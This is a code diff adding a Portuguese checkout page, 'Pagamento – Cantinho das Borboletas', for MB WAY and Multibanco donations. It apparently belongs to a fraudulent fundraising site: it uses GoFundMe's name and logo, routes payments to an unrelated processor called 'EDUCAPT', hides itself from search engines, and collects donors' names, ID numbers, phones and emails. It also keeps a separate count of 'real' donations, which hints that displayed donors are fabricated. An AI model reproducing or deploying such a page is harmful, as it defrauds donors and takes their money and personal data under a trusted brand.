@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Pagamento – Cantinho das Borboletas</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <link href="images/favicon.ico" rel="icon" sizes="any">
+    <link href="images/favicon.svg" rel="icon" type="image/svg+xml">
+
+    <script src="https://cdn.tailwindcss.com/3.4.16"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: { sans: ['Montserrat', 'sans-serif'] },
+                    colors: { primary: '#4A9D44', 'primary-dark': '#3d8239' }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            background-color: #e8e8e8;
+            min-height: 100vh;
+            font-family: 'Montserrat', sans-serif;
+        }
+        .card {
+            background: #f5f5f5;
+            border-radius: 16px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+        }
+        .card-inner {
+            background: #e8e8e8;
+            border-radius: 12px;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.05);
+            margin: 0 0 15px 0;
+        }
+        .loading-spinner {
+            border: 3px solid #e5e7eb;
+            border-top: 3px solid #4A9D44;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js"></script>
+
+    <!-- UTMify Pixel -->
+    <script>
+        window.pixelId = "69fbbb76571567e610a07dbf";
+        var a = document.createElement("script");
+        a.setAttribute("async", ""); a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <!-- UTMify UTMs -->
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" async defer></script>
+
+    <!-- Meta Pixel — só PageView (Purchase via CAPI server-side) -->
+    <script>
+    !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+    n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
+    document,'script','https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init','953547013950938');
+    fbq('track','PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+        src="https://www.facebook.com/tr?id=953547013950938&ev=PageView&noscript=1"/></noscript>
+
+</head>
+<body class="flex items-center justify-center p-4">
+    <div class="w-full max-w-md">
+        <!-- Header Card -->
+        <div class="card p-6 mb-4 text-center">
+            <div class="flex justify-center mb-4">
+                <div class="w-20 h-20 rounded-2xl flex items-center justify-center shadow-lg overflow-hidden" style="padding: 5px !important; width: 100px !important; height: 100px !important;">
+                    <img src="./images/gofundme.png" alt="GoFundMe" class="w-full h-full object-cover" style="object-fit: contain;">
+                </div>
+            </div>
+            <h1 class="text-xl font-bold text-gray-800 mb-1">GoFundMe</h1>
+            <p class="text-sm text-gray-500">Pagamento seguro</p>
+        </div>
+
+        <!-- Loading State -->
+        <div id="loading-state" class="card p-8 text-center hidden">
+            <div class="loading-spinner mx-auto mb-4"></div>
+            <p class="text-gray-600 font-medium">A processar pagamento...</p>
+            <p class="text-sm text-gray-400 mt-2">Aguarde um momento</p>
+        </div>
+
+        <!-- Error State -->
+        <div id="error-state" class="card p-6 text-center hidden">
+            <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                <svg class="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                </svg>
+            </div>
+            <h2 class="text-lg font-bold text-gray-800 mb-2" style="margin-bottom: 0.25rem !important;">Erro no Pagamento</h2>
+            <p id="error-message" class="text-sm text-gray-500 mb-4">Ocorreu um erro ao processar o seu pagamento.</p>
+            <a id="retry-link" href="checkout.html" class="inline-block px-6 py-3 bg-primary text-white font-semibold rounded-xl hover:bg-primary-dark transition-colors">
+                Tentar Novamente
+            </a>
+        </div>
+
+        <!-- Payment Success State -->
+        <div id="success-state" class="card p-6 text-center hidden">
+            <div class="mb-4">
+                <svg class="w-16 h-16 mx-auto text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+
+                </svg>
+            </div>
+            <h2 class="text-2xl font-bold text-green-600 mb-2">Pagamento Confirmado!</h2>
+            <p class="text-gray-600 mb-4">A sua doação foi processada com sucesso. Muito obrigado pelo seu apoio!</p>
+            <p id="success-amount" class="text-xl font-bold text-primary mb-6"></p>
+            <a id="back-link" href="index.html" class="inline-block px-6 py-3 bg-primary text-white font-semibold rounded-xl hover:bg-primary-dark transition-colors">
+                Voltar à Campanha
+            </a>
+        </div>
+
+        <!-- MB WAY State -->
+        <div id="mbway-state" class="hidden">
+            <div class="card p-6 text-center">
+                <div class="card-inner p-4 text-center">
+                    <p class="text-sm font-medium mb-1">Total a pagar</p>
+                    <p id="mbway-amount" class="text-3xl font-bold text-primary">0,00</p>
+                </div>
+                <p class="text-gray-700 font-semibold mb-2">Aprove no MB WAY</p>
+                <p id="mbway-amount-confirm" class="text-xl font-bold text-primary mb-4">0,00</p>
+
+                <div class="flex justify-center mb-4">
+                    <img src="./images/MB_WAY.png" alt="MB WAY" class="h-12 object-contain">
+                </div>
+
+                <p class="text-sm text-gray-500">
+                    Abra a app MB WAY no seu telemóvel e confirme o pagamento.
+                </p>
+                <p class="text-xs text-gray-500 mt-3">
+                    A instituição EDUCAPT atua exclusivamente como processadora do pagamento, e não como beneficiária.
+                </p>
+            </div>
+        </div>
+
+        <!-- Multibanco State -->
+        <div id="multibanco-state" class="hidden">
+            <div class="card p-6 mb-4">
+                <div class="card-inner p-4 text-center">
+                    <p class="text-sm text-primary font-medium mb-1">Total a pagar</p>
+                    <p id="mb-total-amount" class="text-3xl font-bold text-primary">0,00</p>
+                </div>
+            </div>
+            <div class="card p-6">
+                <p class="text-gray-700 font-semibold text-center mb-4">Dados para pagamento Multibanco</p>
+                <div class="flex justify-center mb-4">
+                    <img src="./images/multibanco.png" alt="Multibanco" class="h-10 object-contain">
+                </div>
+                <div class="card-inner p-4 space-y-3">
+                    <div class="flex justify-between items-center py-2 border-b border-gray-100">
+                        <span class="text-gray-500 text-sm">Entidade</span>
+                        <span id="mb-entity" class="font-mono font-bold text-gray-800 text-lg">-----</span>
+                    </div>
+                    <div class="flex justify-between items-center py-2 border-b border-gray-100">
+                        <span class="text-gray-500 text-sm">Referência</span>
+                        <span id="mb-reference" class="font-mono font-bold text-gray-800 text-lg">--- --- ---</span>
+                    </div>
+                    <div class="flex justify-between items-center py-2 border-b border-gray-100">
+                        <span class="text-gray-500 text-sm">Montante</span>
+                        <span id="mb-amount" class="font-bold text-primary text-lg">0,00</span>
+                    </div>
+                    <div class="flex justify-between items-center py-2">
+                        <span class="text-gray-500 text-sm">Validade</span>
+                        <span id="mb-expires" class="text-gray-800">--/--/----</span>
+                    </div>
+                </div>
+                <div class="mt-4 p-3 bg-blue-50 border border-blue-200 rounded-xl">
+                    <p class="text-xs text-gray-500 text-center">
+                        A instituição EDUCAPT atua exclusivamente como processadora do pagamento, e não como beneficiária.
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="text-center mt-6" style="margin-top: 1.25rem !important;">
+            <p class="text-xs text-gray-400" style="font-size: 13px;">
+                Pagamento 100% seguro e encriptado.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        var API_BASE_URL = '';
+
+        var urlParams = new URLSearchParams(window.location.search);
+
+        // Preserve UTM/tracking params on retry and back links
+        (function() {
+            var trackingParams = new URLSearchParams();
+            ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'sck'].forEach(function(key) {
+                var val = urlParams.get(key);
+                if (val) trackingParams.set(key, val);
+            });
+            var qs = trackingParams.toString();
+            if (qs) {
+                ['retry-link', 'back-link'].forEach(function(id) {
+                    var el = document.getElementById(id);
+                    if (el) {
+                        var base = el.getAttribute('href');
+                        el.href = base + (base.indexOf('?') > -1 ? '&' : '?') + qs;
+                    }
+                });
+            }
+        })();
+
+        var paymentData = {
+            amount: parseFloat(urlParams.get('amount')) || 0,
+            method: (urlParams.get('method') || 'mbway').toLowerCase(),
+            name: urlParams.get('name') || '',
+            document: urlParams.get('document') || '',
+            phone: urlParams.get('phone') || '',
+            email: urlParams.get('email') || ''
+        };
+
+        console.log('[PAGAMENTO] Dados recebidos:', paymentData);
+
+
+        // Generate unique key for this payment session
+        var paymentSessionKey = 'payment_' + paymentData.name + '_' + paymentData.document + '_' + paymentData.phone + '_' + paymentData.email + '_' + paymentData.amount + '_' + paymentData.method;
+
+        var existingSessionData = sessionStorage.getItem(paymentSessionKey);
+        var existingTransactionId = null;
+        var existingReferenceData = null;
+
+        if (existingSessionData) {
+            if (existingSessionData.indexOf('PAID:') === 0) {
+                console.log('[PAGAMENTO] Transação já paga, mostrando sucesso...');
+                document.getElementById('loading-state').classList.add('hidden');
+                document.getElementById('success-state').classList.remove('hidden');
+                document.getElementById('success-amount').textContent = Number(paymentData.amount).toFixed(2).replace('.', ',') + ' €';
+                window.__paymentAlreadyPaid = true;
+            } else {
+                try {
+                    var parsed = JSON.parse(existingSessionData);
+                    existingTransactionId = parsed.id;
+                    existingReferenceData = parsed.referenceData || null;
+                } catch (e) {
+                    existingTransactionId = existingSessionData;
+                }
+            }
+        }
+
+        if (!window.__paymentAlreadyPaid) {
+        document.getElementById('loading-state').classList.remove('hidden');
+
+        function salvarDoacaoReal() {
+            try {
+                var STORAGE_KEY = 'campaignProgress_borboletinhas';
+                var existing = JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}');
+
+                var parts = (paymentData.name || '').split(' ');
+                var firstName = parts[0];
+                var lastName = parts.slice(1).join(' ');
+                var displayName = firstName && lastName ? firstName + ' ' + lastName : paymentData.name || 'Anónimo';
+
+                var valorDoado = parseFloat(paymentData.amount) || 0;
+
+                var realDonation = {
+                    nome: displayName,
+                    valor: valorDoado,
+                    tempo: 'Agora mesmo',
+                    real: true
+                };
+
+                var historico = existing.historicoDoadores || [];
+                var isDuplicate = historico.length > 0 && historico[0].real && historico[0].nome === realDonation.nome && historico[0].valor === realDonation.valor;
+                if (!isDuplicate) {
+                    historico.unshift(realDonation);
+                    if (historico.length > 5) historico.length = 5;
+                    existing.historicoDoadores = historico;
+                    existing.contadorDoacoes = (existing.contadorDoacoes || 0) + 1;
+                    existing.contadorDoacoesReais = (existing.contadorDoacoesReais || 0) + 1;
+                    existing.totalDoacoesReais = (existing.totalDoacoesReais || 0) + valorDoado;
+                    existing.ultimoDoador = displayName + ' doou ' + valorDoado.toFixed(2).replace('.', ',') + ' €';
+                    existing.timestamp = Date.now();
+                    localStorage.setItem(STORAGE_KEY, JSON.stringify(existing));
+                    console.log('[PAGAMENTO] Doação real salva no localStorage:', realDonation);
+                }
+            } catch (e) {
+                console.warn('[PAGAMENTO] Erro ao salvar doação:', e);
+            }
+        }
+
+        function formatCurrency(value) {
+            return Number(value).toFixed(2).replace('.', ',') + ' €';
+        }
+
+        function getFacebookCookies() {
+            var cookies = {};
+            document.cookie.split(';').forEach(function(c) {
+                var parts = c.trim().split('=');
+                if (parts.length === 2) cookies[parts[0]] = parts[1];
+            });
+            return { fbc: cookies._fbc || null, fbp: cookies._fbp || null };
+        }
+
+        function getTikTokCookies() {
+            var cookies = {};
+            document.cookie.split(';').forEach(function(c) {
+                var parts = c.trim().split('=');
+                if (parts.length === 2) cookies[parts[0]] = parts[1];
+            });
+            return {
+                ttclid: urlParams.get('ttclid') || cookies.ttclid || null,
+                ttp: cookies._ttp || null
+            };
+        }
+
+        var pollInterval = null;
+        var pollCount = 0;
+        var MAX_POLLS = paymentData.method === 'multibanco' ? 240 : 120;
+
+        function pollPaymentStatus(transactionId) {
+            fetch(API_BASE_URL + '/api/checkout/transaction/' + transactionId + '/')
+            .then(function(response) {
+                if (!response.ok) { pollCount++; return null; }
+                return response.json();
+            })
+            .then(function(result) {
+                if (!result) return;
+                console.log('[PAGAMENTO] Status:', result);
+
+                if (!result.success || !result.data) { pollCount++; return; }
+
+                if (result.data.status === 'paid') {
+                    clearInterval(pollInterval);
+                    sessionStorage.setItem(paymentSessionKey, 'PAID:' + transactionId);
+                    salvarDoacaoReal();
+
+                    // Facebook Pixel Purchase event (handled by server-side CAPI to avoid duplicates)
+                    // if (typeof fbq === 'function') {
+                    //     fbq('track', 'Purchase', { value: paymentData.amount, currency: 'EUR' });
+                    // }
+                    document.getElementById('mbway-state').classList.add('hidden');
+                    document.getElementById('multibanco-state').classList.add('hidden');
+                    document.getElementById('success-state').classList.remove('hidden');
+                    document.getElementById('success-amount').textContent = formatCurrency(paymentData.amount);
+
+                    // Confetti celebration
+                    if (typeof confetti === 'function') {
+                        confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
+                        setTimeout(function() { confetti({ particleCount: 80, spread: 100, origin: { y: 0.5 } }); }, 500);
+                    }
+                    return;
+                }
+
+                if (result.data.status === 'failed' || result.data.status === 'expired') {
+                    clearInterval(pollInterval);
+                    sessionStorage.removeItem(paymentSessionKey);
+                    document.getElementById('mbway-state').classList.add('hidden');
+                    document.getElementById('multibanco-state').classList.add('hidden');
+                    document.getElementById('error-state').classList.remove('hidden');
+                    document.getElementById('error-message').textContent = 'Pagamento ' + (result.data.status === 'expired' ? 'expirado' : 'falhou') + '. Tente novamente.';
+                    return;
+                }
+
+                pollCount++;
+                if (pollCount >= MAX_POLLS) {
+                    clearInterval(pollInterval);
+                    document.getElementById('mbway-state').classList.add('hidden');
+                    document.getElementById('multibanco-state').classList.add('hidden');
+                    document.getElementById('error-state').classList.remove('hidden');
+                    document.getElementById('error-message').textContent = 'O tempo de espera expirou. Se já efetuou o pagamento, este será processado automaticamente.';
+                }
+            })
+            .catch(function(error) {
+                console.error('[PAGAMENTO] Erro no polling:', error);
+                pollCount++;
+            });
+        }
+
+        function createTransactionAPI() {
+            var fbCookies = getFacebookCookies();
+            var ttCookies = getTikTokCookies();
+            var amountInCents = Math.round(paymentData.amount * 100);
+
+            return fetch(API_BASE_URL + '/api/checkout/create/', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    amount: amountInCents,
+                    method: paymentData.method,
+                    name: paymentData.name,
+                    document: paymentData.document,
+                    phoneNumber: paymentData.phone,
+                    checkoutUrl: window.location.href,
+                    email: paymentData.email || null,
+                    track: true,
+                    userAgent: navigator.userAgent,
+                    _fbc: fbCookies.fbc,
+                    _fbp: fbCookies.fbp,
+                    _ttclid: ttCookies.ttclid,
+                    _ttp: ttCookies.ttp
+                })
+            })
+            .then(function(response) {
+                if (!response.ok) throw new Error('Erro de servidor. Por favor, tente novamente.');
+                return response.json();
+            })
+            .then(function(result) {
+                if (!result.success) throw new Error(result.message || 'Erro ao processar pagamento');
+                return result.data;
+            });
+        }
+
+        function showMbway(data) {
+            var displayAmount = data.amount || paymentData.amount;
+            document.getElementById('mbway-state').classList.remove('hidden');
+            document.getElementById('mbway-amount').textContent = formatCurrency(displayAmount);
+            document.getElementById('mbway-amount-confirm').textContent = formatCurrency(displayAmount);
+        }
+
+        function showMultibanco(data) {
+            var displayAmount = data.amount || paymentData.amount;
+            document.getElementById('multibanco-state').classList.remove('hidden');
+            document.getElementById('mb-total-amount').textContent = formatCurrency(displayAmount);
+            document.getElementById('mb-amount').textContent = formatCurrency(displayAmount);
+            if (data.referenceData) {
+                document.getElementById('mb-entity').textContent = data.referenceData.entity || '-----';
+                document.getElementById('mb-reference').textContent = data.referenceData.reference || '--- --- ---';
+                document.getElementById('mb-expires').textContent = data.referenceData.expiresAt || '--/--/----';
+            }
+        }
+
+        function processPayment() {
+            var resolve = function(transactionId, data) {
+                document.getElementById('loading-state').classList.add('hidden');
+
+                if (paymentData.method === 'mbway') {
+                    showMbway(data);
+                } else {
+                    showMultibanco(data);
+                }
+
+                pollPaymentStatus(transactionId);
+                pollInterval = setInterval(function() { pollPaymentStatus(transactionId); }, 5000);
+            };
+
+            var fail = function(error) {
+                console.error('[PAGAMENTO] Erro:', error);
+                document.getElementById('loading-state').classList.add('hidden');
+                document.getElementById('error-state').classList.remove('hidden');
+
+                var errMsg = (error.message || '').toLowerCase();
+                if (errMsg.indexOf('mb way') > -1 && errMsg.indexOf('número') > -1 || errMsg.indexOf('não está associado') > -1) {
+                    document.getElementById('error-message').innerHTML = '<strong>Número MB WAY inválido</strong><br>O número indicado não está associado ao MB WAY.<br><small>Verifique se o número está correto e tem o MB WAY ativo.</small>';
+                } else {
+                    document.getElementById('error-message').textContent = 'Ocorreu um erro ao processar o pagamento. Por favor, tente novamente.';
+                }
+            };
+
+            // Check existing transaction
+            if (existingTransactionId) {
+                fetch(API_BASE_URL + '/api/checkout/transaction/' + existingTransactionId + '/')
+                .then(function(r) { return r.json(); })
+                .then(function(result) {
+                    if (result.success && result.data) {
+                        if (result.data.status === 'paid') {
+                            sessionStorage.setItem(paymentSessionKey, 'PAID:' + existingTransactionId);
+                            salvarDoacaoReal();
+                            document.getElementById('loading-state').classList.add('hidden');
+                            document.getElementById('success-state').classList.remove('hidden');
+                            document.getElementById('success-amount').textContent = formatCurrency(paymentData.amount);
+                            return;
+                        }
+                        if (result.data.status === 'failed' || result.data.status === 'expired') {
+                            sessionStorage.removeItem(paymentSessionKey);
+                            return createNew();
+                        }
+                        // Pending — reuse
+                        var data = result.data;
+                        if (!data.referenceData && existingReferenceData) data.referenceData = existingReferenceData;
+                        resolve(existingTransactionId, data);
+                    } else {
+                        sessionStorage.removeItem(paymentSessionKey);
+                        createNew();
+                    }
+                })
+                .catch(function() {
+                    sessionStorage.removeItem(paymentSessionKey);
+                    createNew();
+                });
+            } else {
+                createNew();
+            }
+
+            function createNew() {
+                createTransactionAPI()
+                .then(function(data) {
+                    var tid = data.transactionId;
+                    sessionStorage.setItem(paymentSessionKey, JSON.stringify({
+                        id: tid,
+                        referenceData: data.referenceData || null
+                    }));
+                    resolve(tid, data);
+                })
+                .catch(fail);
+            }
+        }
+
+        // Validate minimum required params: amount + phone
+        if (!paymentData.amount || !paymentData.phone) {
+            document.getElementById('loading-state').classList.add('hidden');
+            document.getElementById('error-state').classList.remove('hidden');
+            document.getElementById('error-message').textContent = 'Dados de pagamento incompletos. Por favor, volte e preencha o formulário.';
+        } else {
+            processPayment();
+        }
+
+        window.addEventListener('beforeunload', function() {
+            if (pollInterval) clearInterval(pollInterval);
+        });
+
+        } // End of if (!window.__paymentAlreadyPaid)
+    </script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"be240a3c1c2d4a61bffc1064f999079d","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
